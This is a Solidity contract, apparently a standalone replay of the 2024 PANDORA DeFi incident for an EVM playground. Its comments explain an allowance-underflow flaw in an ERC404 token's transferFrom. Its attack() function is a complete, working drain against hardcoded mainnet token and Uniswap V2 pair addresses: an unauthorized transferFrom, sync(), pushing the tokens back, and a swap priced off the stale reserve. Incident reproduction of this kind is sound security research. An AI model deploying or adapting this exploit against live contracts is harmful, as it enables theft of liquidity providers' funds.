// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-PANDORA).
//
// The DeFiHackLabs PoC (test/PANDORA_exp.sol) runs the whole attack INLINE in
// the Foundry test contract itself: the attacker is `address(this)` (the test
// contract), calling PandorasNodes404 (`PANDORA`) and the BLOCK/WETH Uniswap
// V2 pair directly -- there is no standalone exploit contract to deploy. This
// file is a faithful, self-contained copy of that inline attack (pull BLOCK
// out via an unauthorized transferFrom -> sync() the pair to a starved
// reserve -> push BLOCK back in -> swap against the stale cached reserve) so
// the playground can deploy it and record attack(). Logic and constants are
// copied verbatim from test/PANDORA_exp.sol::testExploit().
//
// Root cause: PandorasNodes404 (an ERC404 token) overloads transferFrom():
// amounts > `minted` take the unguarded ERC20 branch, which computes
// `allowance[from][msg.sender] = allowed - amountOrId` with NO
// `require(allowed >= amountOrId)` check, compiled under Solidity 0.7.6 (no
// built-in underflow protection). With zero allowance, the subtraction
// silently underflows and the transfer proceeds anyway -- anyone can move
// anyone's BLOCK. The attacker weaponizes this against the BLOCK/WETH
// Uniswap V2 pair: pull the pair's BLOCK out and sync() to cache a
// BLOCK-starved reserve, snapshot that reserve, push the BLOCK back in
// (restoring the physical balance but not the cached reserve), then swap
// using the stale, BLOCK-starved reserve to price the trade -- draining
// almost the entire WETH side of the pool.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface INoReturnTransferFrom {
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract PANDORADrain {
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    INoReturnTransferFrom constant PANDORA = INoReturnTransferFrom(0xddaDF1bf44363D07E750C20219C2347Ed7D826b9);
    IUniPairV2 constant V2_PAIR = IUniPairV2(0x89CB997C36776D910Cfba8948Ce38613636CBc3c);

    // Mirrors ContractTest.testExploit() exactly (test/PANDORA_exp.sol:32-46),
    // with `address(this)` now this contract instead of the Foundry test.
    function attack() external {
        uint256 pandora_balance = IERC20(address(PANDORA)).balanceOf(address(V2_PAIR));

        // step 1: pull almost all BLOCK out of the pair with ZERO allowance --
        // the ERC20 branch underflows `allowance[from][caller] - amount` (0.7.6,
        // no underflow guard) instead of reverting, so the unauthorized move
        // succeeds.
        PANDORA.transferFrom(address(V2_PAIR), address(PANDORA), pandora_balance - 1);

        // step 2: cache the now BLOCK-starved reserve.
        V2_PAIR.sync();
        (uint256 ethReserve, uint256 oldPANDORAReserve, ) = V2_PAIR.getReserves();

        // step 3: push the BLOCK back into the pair -- physically restored,
        // but the pair's cached reserve1 still reads the stale, starved value.
        PANDORA.transferFrom(address(PANDORA), address(V2_PAIR), pandora_balance - 1);

        uint256 newPANDORAReserve = IERC20(address(PANDORA)).balanceOf(address(V2_PAIR));
        uint256 amountin = newPANDORAReserve - oldPANDORAReserve;
        uint256 swapAmount = (amountin * 9975 * ethReserve) / (oldPANDORAReserve * 10_000 + amountin * 9975);

        // step 4: swap priced off the stale, BLOCK-starved cached reserve --
        // the pair pays out essentially its entire WETH reserve.
        V2_PAIR.swap(swapAmount, 0, address(this), "");
    }
}
